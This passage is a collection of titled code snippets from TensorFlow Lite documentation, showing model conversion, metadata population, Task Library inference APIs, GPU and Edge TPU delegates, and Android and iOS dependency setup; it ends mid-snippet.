DESCRIPTION: This Java snippet demonstrates how to initialize the ImageSegmenter with options (like using the GPU and specifying the output type as confidence masks) and then run inference on an input image object to get segmentation results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization
ImageSegmenterOptions options =
    ImageSegmenterOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setOutputType(OutputType.CONFIDENCE_MASK)
        .build();
ImageSegmenter imageSegmenter =
    ImageSegmenter.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<Segmentation> results = imageSegmenter.segment(image);
```

----------------------------------------

TITLE: Initializing TFLite Model with GPU or CPU Threads (Kotlin)
DESCRIPTION: Demonstrates how to initialize a TensorFlow Lite model wrapper in Kotlin, checking for GPU support using CompatibilityList and setting the device option to GPU or the number of threads for CPU execution accordingly. This allows the application to leverage hardware acceleration when available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/codegen.md#_snippet_1

LANGUAGE: Kotlin
CODE:
```
    import org.tensorflow.lite.gpu.CompatibilityList
    import org.tensorflow.lite.gpu.GpuDelegate

    val compatList = CompatibilityList()

    val options = if(compatList.isDelegateSupportedOnThisDevice) {
        // if the device has a supported GPU, add the GPU delegate
        Model.Options.Builder().setDevice(Model.Device.GPU).build()
    } else {
        // if the GPU is not supported, run on 4 threads
        Model.Options.Builder().setNumThreads(4).build()
    }

    // Initialize the model as usual feeding in the options object
    val myModel = MyModel.newInstance(context, options)

    // Run inference per sample code
```

----------------------------------------

TITLE: Preparing Model Generation Function for TFLite Conversion (Python)
DESCRIPTION: This code defines a TensorFlow function that wraps the GPT-2 model's generate method and then obtains a concrete function from it. This concrete function captures the TensorFlow graph for the generation process, which is a necessary step before converting the model to the TensorFlow Lite format. It requires the TensorFlow library and the previously initialized KerasNLP GPT-2 model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/auto_complete/overview.md#_snippet_1

LANGUAGE: python
CODE:
```
@tf.function
def generate(prompt, max_length):
    """
    Args:
        prompt: input prompt to the LLM in string format
        max_length: the max length of the generated tokens
    """
    return gpt2_lm.generate(prompt, max_length)

concrete_func = generate.get_concrete_function(tf.TensorSpec([], tf.string), 100)
```

----------------------------------------

TITLE: Defining TFLite Image Input Metadata with Normalization - Python
DESCRIPTION: Populates the `input_meta` object with specific details for an image input tensor. This includes setting the tensor name and description, specifying image properties like color space (RGB), defining preprocessing steps such as normalization (with mean and standard deviation), and providing statistics (min and max values) for the tensor's data range.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_4

LANGUAGE: python
CODE:
```
input_meta.name = "image"
input_meta.description = (
    "Input image to be classified. The expected image is {0} x {1}, with "
    "three channels (red, blue, and green) per pixel. Each value in the "
    "tensor is a single byte between 0 and 255.".format(160, 160))
input_meta.content = _metadata_fb.ContentT()
input_meta.content.contentProperties = _metadata_fb.ImagePropertiesT()
input_meta.content.contentProperties.colorSpace = (
    _metadata_fb.ColorSpaceType.RGB)
input_meta.content.contentPropertiesType = (
    _metadata_fb.ContentProperties.ImageProperties)
input_normalization = _metadata_fb.ProcessUnitT()
input_normalization.optionsType = (
    _metadata_fb.ProcessUnitOptions.NormalizationOptions)
input_normalization.options = _metadata_fb.NormalizationOptionsT()
input_normalization.options.mean = [127.5]
input_normalization.options.std = [127.5]
input_meta.processUnits = [input_normalization]
input_stats = _metadata_fb.StatsT()
input_stats.max = [255]
input_stats.min = [0]
input_meta.stats = input_stats
```

----------------------------------------

TITLE: Calling tf.function with tf.Tensor (Print vs tf.print) (Python/TensorFlow)
DESCRIPTION: This snippet executes the `tf.function f` defined previously with a `tf.constant(1)`. It demonstrates that `print` outputs the tensor's metadata during graph construction, while `tf.print` outputs the tensor's value during graph execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_8

LANGUAGE: python
CODE:
```
f(tf.constant(1))
```

----------------------------------------

TITLE: Converting JAX Model to TFLite
DESCRIPTION: Exports the trained JAX model parameters and the `predict` function using Orbax's `JaxModule`, obtains a concrete function with a specified input shape (1x28x28 float32), initializes the TensorFlow Lite converter from this concrete function, converts it to the TFLite format, and saves the resulting model byte string to a file named 'jax_mnist.tflite'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_9

LANGUAGE: Python
CODE:
```
jax_module = JaxModule(params, predict, input_polymorphic_shape='b, ...')
converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [
        jax_module.methods[JaxModule.DEFAULT_METHOD_KEY].get_concrete_function(
            tf.TensorSpec(shape=(1, 28, 28), dtype=tf.float32, name="input")
        )
    ]
)

tflite_model = converter.convert()
with open('jax_mnist.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Initializing TFLite Interpreter & Infer Runner Python
DESCRIPTION: Creates a TensorFlow Lite interpreter instance using the content of the converted TFLite model and allocates tensors. It then obtains a signature runner specifically for the 'infer' function to perform inference using the TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

infer = interpreter.get_signature_runner("infer")
```

----------------------------------------

TITLE: Convert SavedModel (without Pre/Post) to TFLite Python
DESCRIPTION: This snippet converts the second TensorFlow SavedModel (exported without integrated pre/post-processing) into a TensorFlow Lite model. It initializes a `TFLiteConverter` from the `saved_model_dir_2` and converts it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_13

LANGUAGE: python
CODE:
```
converter_1 = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir_2)
tflite_model_1 = converter_1.convert()
```

----------------------------------------

TITLE: Evaluating Model (Python)
DESCRIPTION: Evaluates the trained model using the provided evaluation data. This method calculates and returns the loss value and accuracy metrics for the model on the given dataset. Requires evaluation data and accepts a batch size for processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_4

LANGUAGE: python
CODE:
```
evaluate(
    data, batch_size=32
)
```

----------------------------------------

TITLE: Querying TFLite Searcher Model (Python)
DESCRIPTION: Demonstrates how to load the exported TFLite searcher model using the TFLite Task Library's TextSearcher. It initializes the TextSearcher object from the .tflite file and then performs a search operation using a provided query text string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_searcher.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
from tflite_support.task import text

# Initializes a TextSearcher object.
searcher = text.TextSearcher.create_from_file("searcher.tflite")

# Searches the input query.
results = searcher.search("The Airline Quality Rankings Report looks at the 14 largest U.S. airlines.")
print(results)
```

----------------------------------------

TITLE: Initializing MetadataExtractor (Java)
DESCRIPTION: This Java snippet shows the constructor for the `MetadataExtractor` class, which is used to read metadata from a TFLite model. It requires a `ByteBuffer` containing the model's data. The `ByteBuffer` must remain valid throughout the `MetadataExtractor` object's lifecycle. Requires the `org.tensorflow:tensorflow-lite-metadata` dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_10

LANGUAGE: java
CODE:
```
public MetadataExtractor(ByteBuffer buffer);
```

----------------------------------------

TITLE: Evaluating Saved TFLite Model - Python
DESCRIPTION: Evaluates a previously exported TensorFlow Lite model file using the provided test dataset. This method allows you to assess the performance of the quantized or exported TFLite model separately from the original trained model. Requires the path to the .tflite file and a compatible test data object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_16

LANGUAGE: python
CODE:
```
model.evaluate_tflite('model.tflite', test_data)
```

----------------------------------------

TITLE: Importing TensorFlow Lite Task Library in Android (Java)
DESCRIPTION: This Gradle snippet shows how to add the necessary dependencies for the TensorFlow Lite Task Vision Library (which includes the ImageSegmenter API) and the GPU delegate plugin for Android projects. It also includes a setting to prevent compression of `.tflite` model files in the APK, although this is often not needed in newer Android Gradle plugin versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_0

LANGUAGE: Java
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }
}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-vision'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin'
}
```

----------------------------------------

TITLE: Configure Gradle for TensorFlow Lite Task Text (Java)
DESCRIPTION: Configure the `build.gradle` file for an Android project to include the TensorFlow Lite Task Text dependency and prevent compression of `.tflite` model files in the APK. Note that `aaptOptions` might be optional for newer Android Gradle Plugin versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/bert_question_answerer.md#_snippet_0

LANGUAGE: java
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import the Task Text Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-text:0.4.4'
}
```

----------------------------------------

TITLE: Adding TensorFlow Lite Task Audio Dependency - Gradle
DESCRIPTION: Adds the `org.tensorflow:tensorflow-lite-task-audio` library as an implementation dependency in the module's `build.gradle` file. This library provides the high-level API for audio classification tasks using TensorFlow Lite models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_2

LANGUAGE: Gradle
CODE:
```
dependencies {
...
    implementation 'org.tensorflow:tensorflow-lite-task-audio'
}
```

----------------------------------------

TITLE: Loading Dataset from Android Assets - Kotlin
DESCRIPTION: Loads a JSON file containing the question answering dataset from the application's assets folder. It reads the file content as a string using a BufferedReader and uses the Gson library to deserialize it into a structured DataSet object, returning null if an IOException occurs during file reading or parsing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/question_answer.md#_snippet_5

LANGUAGE: Kotlin
CODE:
```
fun loadJson(): DataSet? {
 var dataSet: DataSet? = null
 try {
 val inputStream: InputStream = context.assets.open(JSON_DIR)
 val bufferReader = inputStream.bufferedReader()
 val stringJson: String = bufferReader.use { it.readText() }
 val datasetType = object : TypeToken<DataSet>() {}.type
 dataSet = Gson().fromJson(stringJson, datasetType)
 } catch (e: IOException) {
 Log.e(TAG, e.message.toString())
 }
 return dataSet
}
```

----------------------------------------

TITLE: Running TFLite Metadata Writer Script - Shell
DESCRIPTION: Executes a Python script (`metadata_writer_for_image_classifier.py`) to populate metadata into a quantized TFLite image classification model. It specifies the path to the model without metadata, the labels file, and the directory where the model with metadata should be exported.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_1

LANGUAGE: sh
CODE:
```
python ./metadata_writer_for_image_classifier.py \
    --model_file=./model_without_metadata/mobilenet_v1_0.75_160_quantized.tflite \
    --label_file=./model_without_metadata/labels.txt \
    --export_directory=model_with_metadata
```

----------------------------------------

TITLE: Converting SavedModel to TFLite Model Python
DESCRIPTION: This snippet uses the `tf.lite.TFLiteConverter` to convert the SavedModel format model, previously saved to `saved_model_dir`, into a TensorFlow Lite model. The `.convert()` method performs the conversion and returns the TFLite model content as a byte string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Configuring iOS CocoaPods Dependency for TFLite Audio
DESCRIPTION: This CocoaPods snippet shows how to add the TensorFlow Lite Task Library audio dependency to your iOS project's Podfile. Including 'TensorFlowLiteTaskAudio' within your target block will install the necessary libraries for audio classification.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_2

LANGUAGE: CocoaPods
CODE:
```
target 'MyAppWithTaskAPI' do
  use_frameworks!
  pod 'TensorFlowLiteTaskAudio'
end
```

----------------------------------------

TITLE: Creating Object Detector Model - Python
DESCRIPTION: This snippet shows the class method signature for creating an object detection model using TensorFlow Lite Model Maker. It requires training data and a model specification, and allows for optional validation data, training epochs, batch size, and fine-tuning control. The method returns a trained object detector model instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/create.md#_snippet_0

LANGUAGE: Python
CODE:
```
@classmethod
tflite_model_maker.object_detector.create(
    train_data: <a href="../../tflite_model_maker/object_detector/DataLoader"><code>tflite_model_maker.object_detector.DataLoader</code></a>,
    model_spec: <a href="../../tflite_model_maker/object_detector/EfficientDetSpec"><code>tflite_model_maker.object_detector.EfficientDetSpec</code></a>,
    validation_data: Optional[<a href="../../tflite_model_maker/object_detector/DataLoader"><code>tflite_model_maker.object_detector.DataLoader</code></a>] = None,
    epochs: Optional[<a href="../../tflite_model_maker/object_detector/DataLoader"><code>tflite_model_maker.object_detector.DataLoader</code></a>] = None,
    batch_size: Optional[int] = None,
    train_whole_model: bool = False,
    do_train: bool = True
) -> T
```

----------------------------------------

TITLE: Initializing and Running Image Segmenter in Python
DESCRIPTION: This Python snippet shows how to import necessary modules from `tflite-support`, configure options like base options (model file) and segmentation options (output type), initialize the `ImageSegmenter` from options (or file), load an image using `TensorImage`, and finally run the segmentation inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_6

LANGUAGE: Python
CODE:
```
# Imports
from tflite_support.task import vision
from tflite_support.task import core
from tflite_support.task import processor

# Initialization
base_options = core.BaseOptions(file_name=model_path)
segmentation_options = processor.SegmentationOptions(
    output_type=processor.SegmentationOptions.output_type.CATEGORY_MASK)
options = vision.ImageSegmenterOptions(base_options=base_options, segmentation_options=segmentation_options)
segmenter = vision.ImageSegmenter.create_from_options(options)

# Alternatively, you can create an image segmenter in the following manner:
# segmenter = vision.ImageSegmenter.create_from_file(model_path)

# Run inference
image_file = vision.TensorImage.create_from_file(image_path)
segmentation_result = segmenter.segment(image_file)
```

----------------------------------------

TITLE: Configuring TensorFlow Lite Hardware Delegate (Kotlin)
DESCRIPTION: Selects a hardware acceleration delegate (CPU, GPU, or NNAPI) using a `when` statement based on the `currentDelegate` and applies it to the `baseOptionsBuilder`. Includes a check for GPU compatibility and provides an error callback if unsupported. Requires the `tensorflow-lite-task-vision` dependency and potentially `tensorflow-lite-gpu` or `tensorflow-lite-nnapi` dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_7

LANGUAGE: Kotlin
CODE:
```
when (currentDelegate) {
    DELEGATE_CPU -> {
        // Default
    }
    DELEGATE_GPU -> {
        if (CompatibilityList().isDelegateSupportedOnThisDevice) {
            baseOptionsBuilder.useGpu()
        } else {
            objectDetectorListener?.onError("GPU is not supported on this device")
        }
    }
    DELEGATE_NNAPI -> {
        baseOptionsBuilder.useNnapi()
    }
}
```

----------------------------------------

TITLE: Creating TextEmbedder From Options - Python
DESCRIPTION: Creates a TextEmbedder object using a TextEmbedderOptions configuration object. This class method allows for more detailed control over the embedder's setup parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.text.TextEmbedderOptions
) -> 'TextEmbedder'
```

----------------------------------------

TITLE: Combining Metadata into Flatbuffers (Python)
DESCRIPTION: This Python code shows how to assemble the model's metadata, including input and output tensor details organized within a subgraph, into a Flatbuffers buffer. It uses the `flatbuffers.Builder` to serialize the `model_meta` object, preparing it for embedding into the TFLite model file. Requires the `flatbuffers` and `tensorflow_lite_support.metadata.python` libraries.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_6

LANGUAGE: python
CODE:
```
# Creates subgraph info.
subgraph = _metadata_fb.SubGraphMetadataT()
subgraph.inputTensorMetadata = [input_meta]
subgraph.outputTensorMetadata = [output_meta]
model_meta.subgraphMetadata = [subgraph]

b = flatbuffers.Builder(0)
b.Finish(
    model_meta.Pack(b),
    _metadata.MetadataPopulator.METADATA_FILE_IDENTIFIER)
metadata_buf = b.Output()
```

----------------------------------------

TITLE: Enable GPU for ObjectDetector Options - Kotlin
DESCRIPTION: Attempts to enable GPU acceleration for the `ObjectDetectorOptions` using a `try-catch` block. This allows the application to gracefully handle cases where GPU support might not be available on the device by catching the exception and notifying the user.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_7

LANGUAGE: Kotlin
CODE:
```
try {
    optionsBuilder.useGpu()
} catch(e: Exception) {
    objectDetectorListener.onError("GPU is not supported on this device")
}
```

----------------------------------------

TITLE: Configuring Coral Edge TPU Delegate (C++)
DESCRIPTION: This C++ snippet illustrates how to configure and enable the Coral Edge TPU delegate within the options for a TensorFlow Lite Task Library task, using `ImageClassifier` as an example. It shows how to load the model file and set the delegate type to `Delegate::EDGETPU_CORAL` in the `tflite_settings`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_6

LANGUAGE: C++
CODE:
```
// Initialization
ImageClassifierOptions options;
// Load the TFLite model.
options.mutable_base_options()->mutable_model_file()->set_file_name(model_file);
// Turn on Coral Edge TPU delegation.
options.mutable_base_options()->mutable_compute_settings()->mutable_tflite_settings()->set_delegate(Delegate::EDGETPU_CORAL);
// Create ImageClassifier from options.
std::unique_ptr<ImageClassifier> image_classifier = ImageClassifier::CreateFromOptions(options).value();

// Run inference on Coral Edge TPU.
const ClassificationResult result = image_classifier->Classify(*frame_buffer).value();
```

----------------------------------------

TITLE: Implementing and Registering TFLite Custom Op C++
DESCRIPTION: This C++ snippet provides an example of how to implement and register a custom operation within the TensorFlow Lite interpreter. The `custom_name` must exactly match the name specified in the `experimental_implements` signature defined in the TensorFlow model's `tf.function`. It shows the basic structure including `prepare` and `invoke` function placeholders and how to add the registration to a TFLite `resolver`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/operation_fusion.md#_snippet_1

LANGUAGE: cpp
CODE:
```
  TfLiteRegistration reg = {};
  // This name must match the name specified in the implements signature.
  static constexpr char kOpName[] = "my_custom_fused_op";
  reg.custom_name = kOpName;
  reg.prepare = [](TfLiteContext* context, TfLiteNode* node) -> TfLiteStatus {
    // Add your code.
    return kTfLiteOk;
  };
  reg.invoke = [](TfLiteContext* context, TfLiteNode* node) -> TfLiteStatus {
    // Add your code.
    return kTfLiteOk;
  };
  reg.builtin_code = kTfLiteCustom;
  resolver->AddCustom(kOpName, &reg);
```

----------------------------------------

TITLE: Create TFLite Interpreter with GPU Delegate (Kotlin)
DESCRIPTION: Configures `InterpreterApi.Options` to use the GPU delegate factory by adding `GpuDelegateFactory()`. It then initializes a `InterpreterApi` instance with the loaded model and these GPU-enabled options. Demonstrates a placeholder for running inference using the configured interpreter. Requires a loaded TFLite `model` and input/output data structures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
val options = InterpreterApi.Options()
      .setRuntime(TfLiteRuntime.FROM_SYSTEM_ONLY)
      .addDelegateFactory(GpuDelegateFactory())

    val interpreter = InterpreterApi(model, options)

    // Run inference
    writeToInput(input)
    interpreter.run(input, output)
    readFromOutput(output)
```

----------------------------------------

TITLE: Creating ImageClassifier From File Python
DESCRIPTION: A class method that creates an `ImageClassifier` object by loading a TensorFlow Lite model directly from a file path. This is a convenient factory method for quickly setting up the classifier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifier.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_file(
    file_path: str
) -> 'ImageClassifier'
```

----------------------------------------

TITLE: Monitoring TFLite Benchmark Logs (ADB Shell)
DESCRIPTION: This command sequence clears the Android logcat buffer and then streams new log messages, filtering for lines containing 'tflite'. This allows developers to monitor the benchmark's progress and see intermediate results or status updates directly in the console.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/experimental/delegate_performance/android/README.md#_snippet_14

LANGUAGE: ADB Shell
CODE:
```
adb logcat -c && adb logcat -v color | grep "tflite"
```

----------------------------------------

TITLE: Initializing TFLite ImageClassifier Python
DESCRIPTION: Initializes the ImageClassifier object. This constructor is typically used internally or when advanced configuration via `ImageClassifierOptions` is required. It takes an `options` object specifying configuration and an internal C++ classifier instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageClassifier.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.vision.ImageClassifier(
    options: <a href="../../../tflite_support/task/vision/ImageClassifierOptions"><code>tflite_support.task.vision.ImageClassifierOptions</code></a>,
    classifier: _CppImageClassifier
) -> None
```

----------------------------------------

TITLE: Preprocessing Image for TensorImage Conversion - TensorFlow Lite - Kotlin
DESCRIPTION: Creates an ImageProcessor instance configured with necessary transformations, such as a rotation operation calculated from the image's rotation degrees to orient the image correctly for the model. It then uses this processor to transform the input bitmap and converts the result into a TensorImage object, which is the expected input format for TensorFlow Lite models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_12

LANGUAGE: Kotlin
CODE:
```
val imageProcessor = ImageProcessor.Builder().add(Rot90Op(-imageRotation / 90)).build()

// Preprocess the image and convert it into a TensorImage for detection.
val tensorImage = imageProcessor.process(TensorImage.fromBitmap(image))
```

----------------------------------------

TITLE: Allocating TFLite Micro Tensor Arena (C++)
DESCRIPTION: Defines a constant for the size of the tensor arena and declares a byte array (`uint8_t tensor_arena`) of that size. This memory block is pre-allocated and used by the interpreter to store tensors (input, output, and intermediate values) during model execution. The required size is model-dependent.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_8

LANGUAGE: C++
CODE:
```
const int tensor_arena_size = 2 * 1024;
uint8_t tensor_arena[tensor_arena_size];
```

----------------------------------------

TITLE: Initialize TFLite Interpreter API - Java
DESCRIPTION: This Java snippet initializes the TensorFlow Lite component using `TfLite.initialize()`. This initialization is a prerequisite for using the TFLite Interpreter API via Play services and returns a Task that should be awaited or handled with callbacks.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_6

LANGUAGE: Java
CODE:
```
Task<Void> initializeTask = TfLite.initialize(context);
```

----------------------------------------

TITLE: Setting CameraX Image Analyzer (Kotlin)
DESCRIPTION: Attaches an analyzer lambda to the `ImageAnalysis` use case, running on the specified `cameraExecutor`. The lambda receives `ImageProxy` objects, initializes a shared `Bitmap` buffer if necessary, and delegates the image processing to the `detectObjects` function. Requires CameraX dependencies and an `Executor` for processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_9

LANGUAGE: Kotlin
CODE:
```
.also {
  it.setAnalyzer(cameraExecutor) {
    image -> if (!::bitmapBuffer.isInitialized)
    { bitmapBuffer = Bitmap.createBitmap( image.width, image.height,
    Bitmap.Config.ARGB_8888 ) } detectObjects(image)
    }
  }
```

----------------------------------------

TITLE: Profiling Time and Device by Op Type (tfprof)
DESCRIPTION: This tfprof command profiles execution time aggregated by operation type, similar to the previous example. It selects `micros` (execution time) and `device` (where the op was placed) and orders results by `micros`, helping to identify expensive operations and their placement (e.g., CPU or GPU).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_5

LANGUAGE: tfprof
CODE:
```
tfprof> op -select micros,device -order_by micros
```

----------------------------------------

TITLE: Install Dependencies Bash
DESCRIPTION: This snippet uses the pip package manager via shell commands to install the necessary Python libraries for running the example. It installs `orbax-export`, `tf-nightly`, `jax`, `jaxlib`, `transformers`, and `flax`, which are required for model loading, JAX operations, Hugging Face integration, and the orbax export process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_0

LANGUAGE: bash
CODE:
```
!pip install orbax-export

!pip install tf-nightly

!pip install --upgrade jax jaxlib

!pip install transformers flax
```

----------------------------------------

TITLE: Exporting TensorFlow Lite Model Simple Example Python
DESCRIPTION: Exports the trained model to the TensorFlow Lite format, including metadata. The exported model is saved in the current directory (export_dir='.') and includes embedded label files, using default full integer quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
model.export(export_dir='.')
```

----------------------------------------

TITLE: Predict Top-K Results (Python)
DESCRIPTION: Performs inference on the provided data and returns the top-k predictions. Each prediction includes the predicted label and its corresponding probability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_8

LANGUAGE: Python
CODE:
```
predict_top_k(
    data, k=1, batch_size=32
)
```

----------------------------------------

TITLE: Checking GPU Compatibility for Keras TFLite Model (Compatible ops) using Analyzer API (Python)
DESCRIPTION: This example demonstrates checking GPU delegate compatibility for a model designed with operations generally compatible with the GPU delegate. It uses the same simple Keras model as a previous example but adds the `gpu_compatibility=True` option to the `analyze` call. The output should indicate compatibility, although runtime success on all devices is not guaranteed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/model_analyzer.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
model = tf.keras.models.Sequential([
  tf.keras.layers.Flatten(input_shape=(128, 128)),
  tf.keras.layers.Dense(256, activation='relu'),
  tf.keras.layers.Dropout(0.2),
  tf.keras.layers.Dense(10)
])

fb_model = tf.lite.TFLiteConverter.from_keras_model(model).convert()

tf.lite.experimental.Analyzer.analyze(model_content=fb_model, gpu_compatibility=True)
```

----------------------------------------

TITLE: Defining TFLite Model Evaluation Helper Python
DESCRIPTION: Defines a Python function `evaluate_model` that takes a TFLite interpreter as input. It iterates through the entire test dataset, runs inference for each image, determines the predicted digit, and calculates the overall accuracy by comparing predictions to true labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_15

LANGUAGE: python
CODE:
```
# A helper function to evaluate the TF Lite model using "test" dataset.
def evaluate_model(interpreter):
  input_index = interpreter.get_input_details()[0]["index"]
  output_index = interpreter.get_output_details()[0]["index"]

  # Run predictions on every image in the "test" dataset.
  prediction_digits = []
  for test_image in test_images:
    # Pre-processing: add batch dimension and convert to float32 to match with
    # the model's input data format.
    test_image = np.expand_dims(test_image, axis=0).astype(np.float32)
    interpreter.set_tensor(input_index, test_image)

    # Run inference.
    interpreter.invoke()

    # Post-processing: remove batch dimension and find the digit with highest
    # probability.
    output = interpreter.tensor(output_index)
    digit = np.argmax(output()[0])
    prediction_digits.append(digit)

  # Compare prediction results with ground truth labels to calculate accuracy.
  accurate_count = 0
  for index in range(len(prediction_digits)):
    if prediction_digits[index] == test_labels[index]:
      accurate_count += 1
  accuracy = accurate_count * 1.0 / len(prediction_digits)

  return accuracy
```

----------------------------------------

TITLE: Building Complex ImageProcessor with Multiple Operations Java
DESCRIPTION: This Java snippet provides a more detailed example of building an `ImageProcessor` using its Builder pattern to combine multiple image manipulation and preprocessing operations. It includes operations like center cropping, resizing, rotation, normalization, and quantization, illustrating how a sequence of transformations can be applied to an image before it is used for TFLite inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_7

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.support.common.ops.NormalizeOp;
import org.tensorflow.lite.support.common.ops.QuantizeOp;
import org.tensorflow.lite.support.image.ops.ResizeOp;
import org.tensorflow.lite.support.image.ops.ResizeWithCropOrPadOp;
import org.tensorflow.lite.support.image.ops.Rot90Op;

int width = bitmap.getWidth();
int height = bitmap.getHeight();

int size = height > width ? width : height;

ImageProcessor imageProcessor =
    new ImageProcessor.Builder()
        // Center crop the image to the largest square possible
        .add(new ResizeWithCropOrPadOp(size, size))
        // Resize using Bilinear or Nearest neighbour
        .add(new ResizeOp(224, 224, ResizeOp.ResizeMethod.BILINEAR))
        // Rotation counter-clockwise in 90 degree increments
        .add(new Rot90Op(rotateDegrees / 90))
        .add(new NormalizeOp(127.5, 127.5))
